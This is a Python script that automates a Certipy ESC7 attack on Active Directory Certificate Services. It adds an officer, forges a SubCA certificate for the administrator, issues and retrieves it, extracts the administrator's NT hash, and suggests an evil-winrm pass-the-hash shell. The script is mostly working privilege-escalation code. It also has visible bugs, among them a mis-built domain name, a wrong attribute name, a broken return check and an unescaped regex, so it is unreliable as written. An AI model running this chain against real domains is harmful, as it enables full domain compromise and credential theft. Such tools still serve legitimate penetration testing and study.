import subprocess
import argparse
import os
import re

pfx_file = None  # Global storage for certificate file
key = None  # Global storage for the private key

def add_officer_CA(args):
    """Adding officer to the CA to gain manage certificate access rights"""
    sname = args.username.split('@')[0]
    print(f"[*] Adding officer {sname} to CA")
    
    command = [
        "certipy", "ca",
        "-ca", args.ca,
        "-dc-ip", args.dc_ip,
        "-add-officer", sname,
        "-u", args.username,
        "-p", args.password
    ]
    
    if args.kerberos:
        print("[+] Kerberos authentication enabled. Requesting TGT...")
        username_parts = args.username.split('@')
        sub_command_getting_tgt = [
            "impacket-gettgt",
            f"{username_parts[1]}/{username_parts[0]}:{args.password}",
            "-dc-ip", args.dc_ip
        ]
        tgt_process = subprocess.Popen(sub_command_getting_tgt, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = tgt_process.communicate()
        
        if f"{args.username}.ccache" in stdout:
            print(f"[+] Retrieved TGT. Setting KRB5CCNAME={args.username}.ccache")
            os.environ["KRB5CCNAME"] = f"{args.username}.ccache"
        else:
            print("[!] Failed to retrieve TGT.")
            print(stderr)
            return 1
        
        command.append("-k")
    
    if args.ns:
        command.append("-ns")
        command.append(args.ns)
    
    add_officer_request = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    stdout, stderr = add_officer_request.communicate()
    print(stdout)
    
    if f"Successfully added officer '{sname}' on '{args.ca}'" in stdout:
        print("[+] Access granted")
        return 0
    return 1

def SubCA_for_Admin(args):
    """Requesting SubCA for administrator"""
    global key  # Use the global key variable
    domain = f"{args.target.split('.')[1]}.{args.target.split('.')[1]}"
    print("[*] Requesting certificate...")

    command = [
        "certipy", "req",
        "-ca", args.ca,
        "-target", args.target,
        "-template", "SubCA",
        "-upn", f"administrator@{domain}",
        "-dc-ip", args.dc_ip,
        "-username", args.username,
        "-password", args.password
    ]

    if args.kerberos:
        command.append("-k")
    if args.ns:
        command.append("-ns")
        command.append(args.ns)
    if args.schema:
        command.append("-scheme")

    SubCA_req = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    stdout, stderr = SubCA_req.communicate()
    print(stdout)

    pattern = r"[*] Saved private key to '(\d+)\.key'"
    match = re.search(pattern, stdout)
    if not match:
        print("[-] Failed to request certificate")
        return None

    key = match.group(1)  # Store globally
    return key

def issue_certificate(args):
    """Issue the failed certificate request"""
    global key  # Use the global key variable
    if not key:
        key = SubCA_for_Admin(args)
        if not key:
            return 1
    
    command = [
        "certipy", "ca",
        "-ca", args.ca,
        "-issue-request", key,
        "-username", args.username,
        "-password", args.password
    ]

    if args.kerberos:
        command.append("-k")

    print("[*] Issuing the failed certificate")
    issue_req = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    stdout, stderr = issue_req.communicate()
    print(stdout)

    if "Successfully issued certificate" in stdout:
        return 0
    print(stderr)
    return 1

def retrieve_certificate(args):
    """Retrieve the issued certificate"""
    global key, pfx_file  # Use global variables
    if issue_certificate(args) != 0:
        return 1
    
    command = [
        "certipy", "req",
        "-ca", args.ca,
        "-target", args.target,
        "-retrieve", key,
        "-username", args.username,
        "-password", args.password
    ]

    if args.kerberos:
        command.append("-k")

    print("[*] Retrieving certificate")
    retrieve_req = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    stdout, stderr = retrieve_req.communicate()
    print(stdout)

    pfx_match = re.search(r"Saved certificate and private key to '(.*?\.pfx)'", stdout)
    if not pfx_match:
        print(stderr)
        print("[!] Failed to locate the .pfx file in the request output.")
        return None

    pfx_file = pfx_match.group(1)  # Store globally
    print("[+] Got certificate for administrator")
    return pfx_file

def authenticate_with_certificate(dc_ip, choose_identity=0):
    """Authenticate using the certificate."""
    global pfx_file  # Use global pfx_file
    if not pfx_file:
        print("[!] No valid certificate found for authentication.")
        return
    
    print("[*] Authenticating with the certificate...")

    auth_command = ["certipy", "auth", "-pfx", pfx_file, "-dc-ip", dc_ip]
    auth_process = subprocess.Popen(auth_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    stdout, stderr = auth_process.communicate()

    print(stdout)
    if "NT hash" in stdout:
        nt_hash = re.search(r"Got NT hash for .*?: ([a-fA-F0-9]{32})", stdout).group(1)
        print(f"[+] NT Hash: {nt_hash}")
        print(f"[>] Use 'evil-winrm -i {dc_ip} -H {nt_hash}' to get a shell.")

def run_certipy_esc7(args):
    """Main function to run certipy ESC1 exploit automation."""
    
    print("[*] Running ESC7 attack chain automation")
    global pfx_file
    if add_officer_CA(args) == 0:
        if retrieve_certificate(args) == 0:
            authenticate_with_certificate(args.dc_ip, args.chose_identity)

def main():
    """Parse arguments and run the script."""
    parser = argparse.ArgumentParser(description="Automate Certipy ESC7 Exploit")
    parser.add_argument("-u", "--username", required=True, help="Username (e.g., john@corp.local)")
    parser.add_argument("-p", "--password", required=True, help="Password (e.g., Passw0rd)")
    parser.add_argument("-c", "--ca", required=True, help="Certificate Authority (e.g., corp-DC-CA)")
    parser.add_argument("-t", "--target", required=True, help="Target CA hostname (e.g., ca.corp.local)")
    parser.add_argument("--template", required=True, help="Certificate template (e.g., ESC1-Test)")
    parser.add_argument("--upn", required=True, help="UPN (e.g., administrator@corp.local)")
    parser.add_argument("--dns", required=True, help="DNS (e.g., dc.corp.local)")
    parser.add_argument("--ns", action="store_true", help="Use name server for non-standard DNS resolution.")
    parser.add_argument("--dc-ip", required=True, help="Domain Controller IP (e.g., 172.16.126.128)")
    parser.add_argument("--chose-identity", type=int, default=0, help="Identity to choose when multiple identifications are found.")
    parser.add_argument("--kerberos", action="store_true", help="Enable Kerberos authentication.")
    parser.add_argument("--scheme", action="store_true", help="Use LDAPS or LDAP (default is LDAPS).")

    args = parser.parse_args()
    run_certipy_esc7(args)

if __name__ == "__main__":
    main()
